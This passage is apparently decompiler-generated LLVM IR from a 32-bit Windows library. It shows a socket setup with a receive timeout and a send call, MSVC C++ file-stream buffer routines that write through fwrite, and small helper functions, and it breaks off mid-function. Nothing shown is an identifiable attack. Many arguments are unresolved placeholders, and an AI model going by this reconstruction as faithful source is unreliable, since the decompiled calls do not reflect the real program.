  store i32 8, i32* %64, align 4, !insn.addr !7684
  store i32 45000, i32* %stack_var_-412, align 4, !insn.addr !7685
  %65 = add i32 %storemerge, -12, !insn.addr !7686
  %66 = inttoptr i32 %65 to i32*, !insn.addr !7686
  %67 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !7686
  store i32 %67, i32* %66, align 4, !insn.addr !7686
  %68 = add i32 %storemerge, -16, !insn.addr !7687
  %69 = inttoptr i32 %68 to i32*, !insn.addr !7687
  store i32 4102, i32* %69, align 4, !insn.addr !7687
  %70 = add i32 %storemerge, -20, !insn.addr !7688
  %71 = inttoptr i32 %70 to i32*, !insn.addr !7688
  store i32 65535, i32* %71, align 4, !insn.addr !7688
  %72 = add i32 %storemerge, -24, !insn.addr !7689
  %73 = inttoptr i32 %72 to i32*, !insn.addr !7689
  store i32 %39, i32* %73, align 4, !insn.addr !7689
  %74 = load i32, i32* %stack_var_-412, align 4, !insn.addr !7690
  %75 = call i32 @setsockopt(i32 %74, i32 0, i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7690
  %76 = add i32 %storemerge, -28, !insn.addr !7691
  %77 = inttoptr i32 %76 to i32*, !insn.addr !7691
  store i32 16, i32* %77, align 4, !insn.addr !7691
  %78 = ptrtoint i16* %stack_var_-396 to i32, !insn.addr !7692
  %79 = add i32 %storemerge, -32, !insn.addr !7693
  %80 = inttoptr i32 %79 to i32*, !insn.addr !7693
  store i32 %78, i32* %80, align 4, !insn.addr !7693
  %81 = add i32 %storemerge, -36, !insn.addr !7694
  %82 = inttoptr i32 %81 to i32*, !insn.addr !7694
  store i32 %39, i32* %82, align 4, !insn.addr !7694
  %83 = add i32 %storemerge, -40, !insn.addr !7695
  %84 = inttoptr i32 %83 to i32*, !insn.addr !7695
  store i32 0, i32* %84, align 4, !insn.addr !7695
  %85 = add i32 %storemerge, -44, !insn.addr !7696
  %86 = inttoptr i32 %85 to i32*, !insn.addr !7696
  %87 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !7697
  %88 = add i32 %storemerge, -48, !insn.addr !7698
  %89 = inttoptr i32 %88 to i32*, !insn.addr !7698
  store i32 %87, i32* %89, align 4, !insn.addr !7698
  %90 = add i32 %storemerge, -52, !insn.addr !7699
  %91 = inttoptr i32 %90 to i32*, !insn.addr !7699
  %92 = add i32 %storemerge, -56, !insn.addr !7700
  %93 = inttoptr i32 %92 to i32*, !insn.addr !7700
  store i32 %39, i32* %93, align 4, !insn.addr !7700
  %94 = call i32 @send(i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7701
  %95 = call i32 @"@__security_check_cookie@4"(), !insn.addr !7702
  ret i32 %95, !insn.addr !7703
}

declare i32 @"??0_Lockit@std@@QAE@H@Z"(i32) local_unnamed_addr

declare i32 @"??1_Init_locks@std@@QAE@XZ"() local_unnamed_addr

declare i32 @"??1_Lockit@std@@QAE@XZ"() local_unnamed_addr

declare i32 @"??$_Fgetc@D@std@@YA_NAADPAU_iobuf@@@Z"(i8*, i32*) local_unnamed_addr

declare i32 @"??$_Fputc@D@std@@YA_NDPAU_iobuf@@@Z"(i8, i32*) local_unnamed_addr

declare i32 @"??0_Init_cout@std@@QAE@XZ"() local_unnamed_addr

declare i32 @"??1?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAE@XZ"() local_unnamed_addr

declare i32 @"??_D?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ"() local_unnamed_addr

define i32 @function_1000d48b(i32 %arg1) {
dec_label_pc_1000d48b:
  %0 = call i32 @"??_G?$basic_ostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z"(i32 %arg1), !insn.addr !7704
  ret i32 %0, !insn.addr !7704
}

declare i32 @"??_G?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z"(i32)

declare i32 @"??_G?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z"(i32)

declare i32 @"??_G?$basic_ostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z"(i32) local_unnamed_addr

declare i32 @"??_Gios_base@std@@UAEPAXI@Z"(i32)

define i1 @"?_Endwrite@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAE_NXZ"() local_unnamed_addr {
dec_label_pc_1000d5d3:
  %eax.1.reg2mem = alloca i32, !insn.addr !7705
  %ecx.3.reg2mem = alloca i32, !insn.addr !7705
  %edi.0.reg2mem = alloca i32, !insn.addr !7705
  %eax.0.reg2mem = alloca i32, !insn.addr !7705
  %esp.1.reg2mem = alloca i32, !insn.addr !7705
  %ecx.0.reg2mem = alloca i32, !insn.addr !7705
  %esp.0.reg2mem = alloca i32, !insn.addr !7705
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__EH_prolog3_GS(i32 40), !insn.addr !7706
  %3 = add i32 %1, 56, !insn.addr !7707
  %4 = inttoptr i32 %3 to i32*, !insn.addr !7707
  %5 = load i32, i32* %4, align 4, !insn.addr !7707
  %6 = icmp eq i32 %5, 0, !insn.addr !7707
  br i1 %6, label %dec_label_pc_1000d6f5, label %dec_label_pc_1000d5ef, !insn.addr !7708

dec_label_pc_1000d5ef:                            ; preds = %dec_label_pc_1000d5d3
  %7 = add i32 %1, 61, !insn.addr !7709
  %8 = inttoptr i32 %7 to i8*, !insn.addr !7709
  %9 = load i8, i8* %8, align 1, !insn.addr !7709
  %10 = icmp eq i8 %9, 0, !insn.addr !7709
  br i1 %10, label %dec_label_pc_1000d6f5, label %dec_label_pc_1000d5f8, !insn.addr !7710

dec_label_pc_1000d5f8:                            ; preds = %dec_label_pc_1000d5ef
  %11 = call i32 @"@_guard_check_icall@4"(), !insn.addr !7711
  %12 = icmp eq i32 %11, -1, !insn.addr !7712
  %13 = icmp eq i1 %12, false, !insn.addr !7713
  br i1 %13, label %dec_label_pc_1000d61b, label %dec_label_pc_1000d6f5, !insn.addr !7714

dec_label_pc_1000d61b:                            ; preds = %dec_label_pc_1000d5f8
  %14 = add i32 %0, -44, !insn.addr !7715
  %15 = inttoptr i32 %14 to i32*, !insn.addr !7715
  store i32 8, i32* %stack_var_-16, align 4, !insn.addr !7716
  %16 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !7716
  %17 = add i32 %0, -24, !insn.addr !7717
  %18 = inttoptr i32 %17 to i32*, !insn.addr !7717
  store i32 0, i32* %18, align 4, !insn.addr !7717
  %19 = add i32 %0, -20, !insn.addr !7718
  %20 = inttoptr i32 %19 to i32*, !insn.addr !7718
  store i32 15, i32* %20, align 4, !insn.addr !7718
  %21 = add i32 %0, -40, !insn.addr !7719
  %22 = inttoptr i32 %21 to i8*, !insn.addr !7719
  store i8 0, i8* %22, align 1, !insn.addr !7719
  %23 = add i32 %1, 64, !insn.addr !7720
  %24 = add i32 %0, -4, !insn.addr !7721
  %25 = inttoptr i32 %24 to i32*, !insn.addr !7721
  store i32 0, i32* %25, align 4, !insn.addr !7721
  %26 = add i32 %0, -48, !insn.addr !7722
  %27 = inttoptr i32 %26 to i32*, !insn.addr !7722
  store i32 %23, i32* %27, align 4, !insn.addr !7722
  %28 = inttoptr i32 %21 to i32*, !insn.addr !7723
  %29 = add i32 %0, -52, !insn.addr !7724
  %30 = inttoptr i32 %29 to i32*
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !7722
  br label %dec_label_pc_1000d63c, !insn.addr !7722

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d6c8, %dec_label_pc_1000d61b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %31 = load i32, i32* %28, align 4, !insn.addr !7723
  %32 = load i32, i32* %20, align 4, !insn.addr !7725
  store i32 %31, i32* %ecx.0.reg2mem, !insn.addr !7725
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !7725
  store i32 %32, i32* %eax.0.reg2mem, !insn.addr !7725
  br label %dec_label_pc_1000d642, !insn.addr !7725

dec_label_pc_1000d642:                            ; preds = %dec_label_pc_1000d6c0, %dec_label_pc_1000d63c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %33 = icmp ult i32 %eax.0.reload, 16, !insn.addr !7726
  %34 = icmp eq i1 %33, false, !insn.addr !7727
  %spec.select = select i1 %34, i32 %ecx.0.reload, i32 %21
  %35 = add i32 %esp.1.reload, -4, !insn.addr !7728
  %36 = inttoptr i32 %35 to i32*, !insn.addr !7728
  store i32 %29, i32* %36, align 4, !insn.addr !7728
  %37 = load i32, i32* %18, align 4, !insn.addr !7729
  %38 = add i32 %spec.select, %37, !insn.addr !7730
  %39 = add i32 %esp.1.reload, -8, !insn.addr !7731
  %40 = inttoptr i32 %39 to i32*, !insn.addr !7731
  store i32 %38, i32* %40, align 4, !insn.addr !7731
  %41 = add i32 %esp.1.reload, -12, !insn.addr !7732
  %42 = inttoptr i32 %41 to i32*, !insn.addr !7732
  store i32 %spec.select, i32* %42, align 4, !insn.addr !7732
  %43 = load i32, i32* %27, align 4, !insn.addr !7733
  %44 = add i32 %esp.1.reload, -16, !insn.addr !7733
  %45 = inttoptr i32 %44 to i32*, !insn.addr !7733
  store i32 %43, i32* %45, align 4, !insn.addr !7733
  %46 = call i32 @"@_guard_check_icall@4"(), !insn.addr !7734
  %47 = icmp eq i32 %46, 0, !insn.addr !7735
  br i1 %47, label %dec_label_pc_1000d67c, label %dec_label_pc_1000d672, !insn.addr !7736

dec_label_pc_1000d672:                            ; preds = %dec_label_pc_1000d642
  %48 = icmp eq i32 %46, 1, !insn.addr !7737
  %49 = icmp eq i1 %48, false, !insn.addr !7738
  br i1 %49, label %dec_label_pc_1000d6e7, label %dec_label_pc_1000d677, !insn.addr !7738

dec_label_pc_1000d677:                            ; preds = %dec_label_pc_1000d672
  %50 = load i32, i32* %15, align 4, !insn.addr !7739
  store i32 %50, i32* %edi.0.reg2mem, !insn.addr !7740
  br label %dec_label_pc_1000d682, !insn.addr !7740

dec_label_pc_1000d67c:                            ; preds = %dec_label_pc_1000d642
  %51 = load i32, i32* %15, align 4, !insn.addr !7741
  %52 = add i32 %51, 61, !insn.addr !7742
  %53 = inttoptr i32 %52 to i8*, !insn.addr !7742
  store i8 0, i8* %53, align 1, !insn.addr !7742
  store i32 %51, i32* %edi.0.reg2mem, !insn.addr !7742
  br label %dec_label_pc_1000d682, !insn.addr !7742

dec_label_pc_1000d682:                            ; preds = %dec_label_pc_1000d67c, %dec_label_pc_1000d677
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %54 = load i32, i32* %20, align 4, !insn.addr !7743
  %55 = load i32, i32* %28, align 4, !insn.addr !7744
  %56 = icmp ult i32 %54, 16, !insn.addr !7745
  %57 = icmp eq i1 %56, false, !insn.addr !7746
  %spec.select2 = select i1 %57, i32 %55, i32 %21
  %58 = load i32, i32* %30, align 4, !insn.addr !7747
  %59 = sub i32 %58, %spec.select2, !insn.addr !7748
  %60 = icmp eq i32 %59, 0, !insn.addr !7748
  store i32 %55, i32* %ecx.3.reg2mem, !insn.addr !7749
  store i32 %54, i32* %eax.1.reg2mem, !insn.addr !7749
  br i1 %60, label %dec_label_pc_1000d6ba, label %dec_label_pc_1000d699, !insn.addr !7749

dec_label_pc_1000d699:                            ; preds = %dec_label_pc_1000d682
  %61 = add i32 %edi.0.reload, 76, !insn.addr !7750
  %62 = inttoptr i32 %61 to i32*, !insn.addr !7750
  %63 = load i32, i32* %62, align 4, !insn.addr !7750
  %64 = add i32 %esp.1.reload, -20, !insn.addr !7750
  %65 = inttoptr i32 %64 to i32*, !insn.addr !7750
  store i32 %63, i32* %65, align 4, !insn.addr !7750
  %66 = add i32 %esp.1.reload, -24, !insn.addr !7751
  %67 = inttoptr i32 %66 to i32*, !insn.addr !7751
  store i32 %59, i32* %67, align 4, !insn.addr !7751
  %68 = add i32 %esp.1.reload, -28, !insn.addr !7752
  %69 = inttoptr i32 %68 to i32*, !insn.addr !7752
  store i32 1, i32* %69, align 4, !insn.addr !7752
  %70 = add i32 %esp.1.reload, -32, !insn.addr !7753
  %71 = inttoptr i32 %70 to i32*, !insn.addr !7753
  store i32 %spec.select2, i32* %71, align 4, !insn.addr !7753
  %72 = call i32 @_fwrite(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !7754
  %73 = icmp eq i32 %59, %72, !insn.addr !7755
  %74 = icmp eq i1 %73, false, !insn.addr !7756
  br i1 %74, label %dec_label_pc_1000d6e7, label %dec_label_pc_1000d6b4, !insn.addr !7756

dec_label_pc_1000d6b4:                            ; preds = %dec_label_pc_1000d699
  %75 = load i32, i32* %20, align 4, !insn.addr !7757
  %76 = load i32, i32* %28, align 4, !insn.addr !7758
  store i32 %76, i32* %ecx.3.reg2mem, !insn.addr !7758
  store i32 %75, i32* %eax.1.reg2mem, !insn.addr !7758
  br label %dec_label_pc_1000d6ba, !insn.addr !7758

dec_label_pc_1000d6ba:                            ; preds = %dec_label_pc_1000d6b4, %dec_label_pc_1000d682
  %77 = add i32 %edi.0.reload, 61, !insn.addr !7759
  %78 = inttoptr i32 %77 to i8*, !insn.addr !7759
  %79 = load i8, i8* %78, align 1, !insn.addr !7759
  %80 = icmp eq i8 %79, 0, !insn.addr !7759
  br i1 %80, label %dec_label_pc_1000d6e7, label %dec_label_pc_1000d6c0, !insn.addr !7760

dec_label_pc_1000d6c0:                            ; preds = %dec_label_pc_1000d6ba
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %81 = icmp eq i1 %60, false, !insn.addr !7761
  store i32 %ecx.3.reload, i32* %ecx.0.reg2mem, !insn.addr !7761
  store i32 %44, i32* %esp.1.reg2mem, !insn.addr !7761
  store i32 %eax.1.reload, i32* %eax.0.reg2mem, !insn.addr !7761
  br i1 %81, label %dec_label_pc_1000d642, label %dec_label_pc_1000d6c8, !insn.addr !7761

dec_label_pc_1000d6c8:                            ; preds = %dec_label_pc_1000d6c0
  %82 = add i32 %esp.1.reload, -20, !insn.addr !7762
  %83 = inttoptr i32 %82 to i32*, !insn.addr !7762
  store i32 0, i32* %83, align 4, !insn.addr !7762
  %84 = add i32 %esp.1.reload, -24, !insn.addr !7763
  %85 = inttoptr i32 %84 to i32*, !insn.addr !7763
  store i32 8, i32* %85, align 4, !insn.addr !7763
  %86 = call i32 @function_10004360(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7764
  store i32 %84, i32* %esp.0.reg2mem, !insn.addr !7765
  br label %dec_label_pc_1000d63c, !insn.addr !7765

dec_label_pc_1000d6e7:                            ; preds = %dec_label_pc_1000d672, %dec_label_pc_1000d6ba, %dec_label_pc_1000d699
  %87 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7766
  br label %dec_label_pc_1000d6f5, !insn.addr !7767

dec_label_pc_1000d6f5:                            ; preds = %dec_label_pc_1000d5d3, %dec_label_pc_1000d5ef, %dec_label_pc_1000d5f8, %dec_label_pc_1000d6e7
  %88 = call i32 @__EH_epilog3_GS(), !insn.addr !7768
  %89 = and i32 %88, 1
  %90 = icmp ne i32 %89, 0, !insn.addr !7769
  ret i1 %90, !insn.addr !7769
}

declare i32 @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ"()

declare i32 @"?_Reset_back@?$basic_filebuf@DU?$char_traits@D@std@@@std@@AAEXXZ"() local_unnamed_addr

declare i32 @"?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ.3"()

define i32 @function_1000d999() local_unnamed_addr {
dec_label_pc_1000d999:
  ret i32 1, !insn.addr !7770
}

define i32 @function_1000d99d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000d99d:
  %0 = sub i32 %arg2, %arg1, !insn.addr !7771
  %1 = icmp ugt i32 %0, %arg3, !insn.addr !7772
  %spec.select = select i1 %1, i32 %arg3, i32 %0
  ret i32 %spec.select, !insn.addr !7773
}

define i32 @function_1000d9b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000d9b5:
  %0 = inttoptr i32 %arg2 to i32*, !insn.addr !7774
  store i32 %arg1, i32* %0, align 4, !insn.addr !7774
  %1 = inttoptr i32 %arg4 to i32*, !insn.addr !7775
  store i32 %arg3, i32* %1, align 4, !insn.addr !7775
  ret i32 3, !insn.addr !7776
}

define i32 @function_1000d9cf(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d9cf:
  %0 = inttoptr i32 %arg2 to i32*, !insn.addr !7777
  store i32 %arg1, i32* %0, align 4, !insn.addr !7777
  ret i32 0, !insn.addr !7778
}

declare i32 @"?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z"(i32*)

define i32 @function_1000da45() {
dec_label_pc_1000da45:
  %eax.1.reg2mem = alloca i32, !insn.addr !7779
  %ecx.3.reg2mem = alloca i32, !insn.addr !7779
  %eax.0.reg2mem = alloca i32, !insn.addr !7779
  %esp.1.reg2mem = alloca i32, !insn.addr !7779
  %ecx.0.reg2mem = alloca i32, !insn.addr !7779
  %esp.0.reg2mem = alloca i32, !insn.addr !7779
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i8, align 1
  %2 = call i32 @__EH_prolog3_GS(i32 48), !insn.addr !7780
  %3 = add i32 %0, 8, !insn.addr !7781
  %4 = inttoptr i32 %3 to i32*, !insn.addr !7781
  %5 = load i32, i32* %4, align 4, !insn.addr !7781
  %6 = icmp eq i32 %5, -1, !insn.addr !7782
  %7 = icmp eq i1 %6, false, !insn.addr !7783
  br i1 %7, label %dec_label_pc_1000da73, label %dec_label_pc_1000dbd7, !insn.addr !7784

dec_label_pc_1000da73:                            ; preds = %dec_label_pc_1000da45
  %8 = add i32 %1, 32, !insn.addr !7785
  %9 = inttoptr i32 %8 to i32*, !insn.addr !7785
  %10 = load i32, i32* %9, align 4, !insn.addr !7785
  %11 = inttoptr i32 %10 to i32*, !insn.addr !7786
  %12 = load i32, i32* %11, align 4, !insn.addr !7786
  %13 = icmp eq i32 %12, 0, !insn.addr !7787
  br i1 %13, label %dec_label_pc_1000daa1, label %dec_label_pc_1000da7c, !insn.addr !7788

dec_label_pc_1000da7c:                            ; preds = %dec_label_pc_1000da73
  %14 = add i32 %1, 48, !insn.addr !7789
  %15 = inttoptr i32 %14 to i32*, !insn.addr !7789
  %16 = load i32, i32* %15, align 4, !insn.addr !7789
  %17 = inttoptr i32 %16 to i32*, !insn.addr !7790
  %18 = load i32, i32* %17, align 4, !insn.addr !7790
  %19 = add i32 %18, %12, !insn.addr !7791
  %20 = icmp ult i32 %12, %19, !insn.addr !7792
  %21 = icmp eq i1 %20, false, !insn.addr !7793
  br i1 %21, label %dec_label_pc_1000daa1, label %dec_label_pc_1000da88, !insn.addr !7793

dec_label_pc_1000da88:                            ; preds = %dec_label_pc_1000da7c
  %22 = add i32 %18, -1, !insn.addr !7794
  store i32 %22, i32* %17, align 4, !insn.addr !7795
  %23 = load i32, i32* %9, align 4, !insn.addr !7796
  %24 = inttoptr i32 %23 to i32*, !insn.addr !7797
  %25 = load i32, i32* %24, align 4, !insn.addr !7797
  %26 = add i32 %25, 1, !insn.addr !7798
  store i32 %26, i32* %24, align 4, !insn.addr !7799
  %27 = trunc i32 %5 to i8, !insn.addr !7800
  %28 = inttoptr i32 %25 to i8*, !insn.addr !7800
  store i8 %27, i8* %28, align 1, !insn.addr !7800
  br label %dec_label_pc_1000dbd7, !insn.addr !7801

dec_label_pc_1000daa1:                            ; preds = %dec_label_pc_1000da7c, %dec_label_pc_1000da73
  %29 = add i32 %1, 76, !insn.addr !7802
  %30 = inttoptr i32 %29 to i32*, !insn.addr !7802
  %31 = load i32, i32* %30, align 4, !insn.addr !7802
  %32 = icmp eq i32 %31, 0, !insn.addr !7802
  br i1 %32, label %dec_label_pc_1000dbd7, label %dec_label_pc_1000daab, !insn.addr !7803

dec_label_pc_1000daab:                            ; preds = %dec_label_pc_1000daa1
  %33 = call i32 @"?_Reset_back@?$basic_filebuf@DU?$char_traits@D@std@@@std@@AAEXXZ"(), !insn.addr !7804
  %34 = load i32, i32* %4, align 4, !insn.addr !7805
  %35 = add i32 %1, 56, !insn.addr !7806
  %36 = inttoptr i32 %35 to i32*, !insn.addr !7806
  %37 = load i32, i32* %36, align 4, !insn.addr !7806
  %38 = icmp eq i32 %37, 0, !insn.addr !7806
  %39 = icmp eq i1 %38, false, !insn.addr !7807
  br i1 %39, label %dec_label_pc_1000dad7, label %dec_label_pc_1000dabc, !insn.addr !7807

dec_label_pc_1000dabc:                            ; preds = %dec_label_pc_1000daab
  %40 = load i32, i32* %30, align 4, !insn.addr !7808
  %41 = trunc i32 %34 to i8, !insn.addr !7809
  store i8 %41, i8* %stack_var_-12, align 1, !insn.addr !7809
  %42 = inttoptr i32 %40 to i32*, !insn.addr !7810
  %43 = call i32 @"??$_Fputc@D@std@@YA_NDPAU_iobuf@@@Z"(i8 %41, i32* %42), !insn.addr !7810
  br label %dec_label_pc_1000dbd7

dec_label_pc_1000dad7:                            ; preds = %dec_label_pc_1000daab
  %44 = add i32 %0, -48, !insn.addr !7811
  %45 = inttoptr i32 %44 to i32*, !insn.addr !7811
  %46 = add i32 %0, -24, !insn.addr !7812
  %47 = inttoptr i32 %46 to i32*, !insn.addr !7812
  store i32 0, i32* %47, align 4, !insn.addr !7812
  %48 = add i32 %0, -40, !insn.addr !7813
  %49 = inttoptr i32 %48 to i8*, !insn.addr !7813
  store i8 0, i8* %49, align 1, !insn.addr !7813
  store i8 8, i8* %stack_var_-12, align 1, !insn.addr !7814
  %50 = ptrtoint i8* %stack_var_-12 to i32, !insn.addr !7814
  %51 = trunc i32 %34 to i8, !insn.addr !7815
  %52 = add i32 %0, -44, !insn.addr !7815
  %53 = inttoptr i32 %52 to i8*, !insn.addr !7815
  store i8 %51, i8* %53, align 1, !insn.addr !7815
  %54 = add i32 %0, -20, !insn.addr !7816
  %55 = inttoptr i32 %54 to i32*, !insn.addr !7816
  store i32 15, i32* %55, align 4, !insn.addr !7816
  %56 = add i32 %0, -4, !insn.addr !7817
  %57 = inttoptr i32 %56 to i32*, !insn.addr !7817
  store i32 0, i32* %57, align 4, !insn.addr !7817
  %58 = add i32 %1, 64, !insn.addr !7818
  %59 = add i32 %0, -52, !insn.addr !7819
  %60 = inttoptr i32 %59 to i32*, !insn.addr !7819
  store i32 %58, i32* %60, align 4, !insn.addr !7819
  %61 = inttoptr i32 %48 to i32*, !insn.addr !7820
  %62 = add i32 %0, -56, !insn.addr !7821
  %63 = add i32 %0, -60, !insn.addr !7822
  %64 = add i32 %0, -43, !insn.addr !7823
  %65 = inttoptr i32 %62 to i32*
  %66 = inttoptr i32 %63 to i32*
  store i32 %50, i32* %esp.0.reg2mem, !insn.addr !7819
  br label %dec_label_pc_1000dafc, !insn.addr !7819

dec_label_pc_1000dafc:                            ; preds = %dec_label_pc_1000dba1, %dec_label_pc_1000dad7
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %67 = load i32, i32* %61, align 4, !insn.addr !7820
  %68 = load i32, i32* %55, align 4, !insn.addr !7824
  store i32 %67, i32* %ecx.0.reg2mem, !insn.addr !7824
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !7824
  store i32 %68, i32* %eax.0.reg2mem, !insn.addr !7824
  br label %dec_label_pc_1000db02, !insn.addr !7824

dec_label_pc_1000db02:                            ; preds = %dec_label_pc_1000db93, %dec_label_pc_1000dafc
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %69 = icmp ult i32 %eax.0.reload, 16, !insn.addr !7825
  %70 = icmp eq i1 %69, false, !insn.addr !7826
  %spec.select = select i1 %70, i32 %ecx.0.reload, i32 %48
  %71 = add i32 %esp.1.reload, -4, !insn.addr !7827
  %72 = inttoptr i32 %71 to i32*, !insn.addr !7827
  store i32 %62, i32* %72, align 4, !insn.addr !7827
  %73 = load i32, i32* %47, align 4, !insn.addr !7828
  %74 = add i32 %spec.select, %73, !insn.addr !7829
  %75 = add i32 %esp.1.reload, -8, !insn.addr !7830
  %76 = inttoptr i32 %75 to i32*, !insn.addr !7830
  store i32 %74, i32* %76, align 4, !insn.addr !7830
  %77 = add i32 %esp.1.reload, -12, !insn.addr !7831
  %78 = inttoptr i32 %77 to i32*, !insn.addr !7831
  store i32 %spec.select, i32* %78, align 4, !insn.addr !7831
  %79 = add i32 %esp.1.reload, -16, !insn.addr !7832
  %80 = inttoptr i32 %79 to i32*, !insn.addr !7832
  store i32 %63, i32* %80, align 4, !insn.addr !7832
  %81 = add i32 %esp.1.reload, -20, !insn.addr !7833
  %82 = inttoptr i32 %81 to i32*, !insn.addr !7833
  store i32 %64, i32* %82, align 4, !insn.addr !7833
  %83 = add i32 %esp.1.reload, -24, !insn.addr !7834
  %84 = inttoptr i32 %83 to i32*, !insn.addr !7834
  store i32 %52, i32* %84, align 4, !insn.addr !7834
  %85 = load i32, i32* %60, align 4, !insn.addr !7835
  %86 = add i32 %esp.1.reload, -28, !insn.addr !7835
  %87 = inttoptr i32 %86 to i32*, !insn.addr !7835
  store i32 %85, i32* %87, align 4, !insn.addr !7835
  %88 = call i32 @"@_guard_check_icall@4"(), !insn.addr !7836
  %89 = icmp slt i32 %88, 0, !insn.addr !7837
  br i1 %89, label %dec_label_pc_1000dbcd, label %dec_label_pc_1000db42, !insn.addr !7838

dec_label_pc_1000db42:                            ; preds = %dec_label_pc_1000db02
  %90 = icmp sgt i32 %88, 1, !insn.addr !7839
  br i1 %90, label %dec_label_pc_1000dbb1, label %dec_label_pc_1000db47, !insn.addr !7839

dec_label_pc_1000db47:                            ; preds = %dec_label_pc_1000db42
  %91 = load i32, i32* %55, align 4, !insn.addr !7840
  %92 = load i32, i32* %61, align 4, !insn.addr !7841
  %93 = icmp ult i32 %91, 16, !insn.addr !7842
  %94 = icmp eq i1 %93, false, !insn.addr !7843
  %spec.select3 = select i1 %94, i32 %92, i32 %48
  %95 = load i32, i32* %65, align 4, !insn.addr !7844
  %96 = sub i32 %95, %spec.select3, !insn.addr !7845
  %97 = icmp eq i32 %96, 0, !insn.addr !7845
  %98 = load i32, i32* %45, align 4
  store i32 %92, i32* %ecx.3.reg2mem, !insn.addr !7846
  store i32 %91, i32* %eax.1.reg2mem, !insn.addr !7846
  br i1 %97, label %dec_label_pc_1000db87, label %dec_label_pc_1000db5e, !insn.addr !7846

dec_label_pc_1000db5e:                            ; preds = %dec_label_pc_1000db47
  %99 = add i32 %98, 76, !insn.addr !7847
  %100 = inttoptr i32 %99 to i32*, !insn.addr !7847
  %101 = load i32, i32* %100, align 4, !insn.addr !7847
  %102 = add i32 %esp.1.reload, -32, !insn.addr !7847
  %103 = inttoptr i32 %102 to i32*, !insn.addr !7847
  store i32 %101, i32* %103, align 4, !insn.addr !7847
  %104 = add i32 %esp.1.reload, -36, !insn.addr !7848
  %105 = inttoptr i32 %104 to i32*, !insn.addr !7848
  store i32 %96, i32* %105, align 4, !insn.addr !7848
  %106 = add i32 %esp.1.reload, -40, !insn.addr !7849
  %107 = inttoptr i32 %106 to i32*, !insn.addr !7849
  store i32 1, i32* %107, align 4, !insn.addr !7849
  %108 = add i32 %esp.1.reload, -44, !insn.addr !7850
  %109 = inttoptr i32 %108 to i32*, !insn.addr !7850
  store i32 %spec.select3, i32* %109, align 4, !insn.addr !7850
  %110 = call i32 @_fwrite(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !7851
  %111 = icmp eq i32 %96, %110, !insn.addr !7852
  %112 = icmp eq i1 %111, false, !insn.addr !7853
  br i1 %112, label %dec_label_pc_1000dbcd, label %dec_label_pc_1000db7c, !insn.addr !7853

dec_label_pc_1000db7c:                            ; preds = %dec_label_pc_1000db5e
  %113 = load i32, i32* %55, align 4, !insn.addr !7854
  %114 = load i32, i32* %61, align 4, !insn.addr !7855
  store i32 %114, i32* %ecx.3.reg2mem, !insn.addr !7856
  store i32 %113, i32* %eax.1.reg2mem, !insn.addr !7856
  br label %dec_label_pc_1000db87, !insn.addr !7856

dec_label_pc_1000db87:                            ; preds = %dec_label_pc_1000db47, %dec_label_pc_1000db7c
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %115 = add i32 %98, 61, !insn.addr !7857
  %116 = inttoptr i32 %115 to i8*, !insn.addr !7857
  store i8 1, i8* %116, align 1, !insn.addr !7857
  %117 = load i32, i32* %66, align 4, !insn.addr !7858
  %118 = icmp eq i32 %117, %52, !insn.addr !7858
  %119 = icmp eq i1 %118, false, !insn.addr !7859
  br i1 %119, label %dec_label_pc_1000dbcd, label %dec_label_pc_1000db93, !insn.addr !7859

dec_label_pc_1000db93:                            ; preds = %dec_label_pc_1000db87
  %120 = icmp eq i1 %97, false, !insn.addr !7860
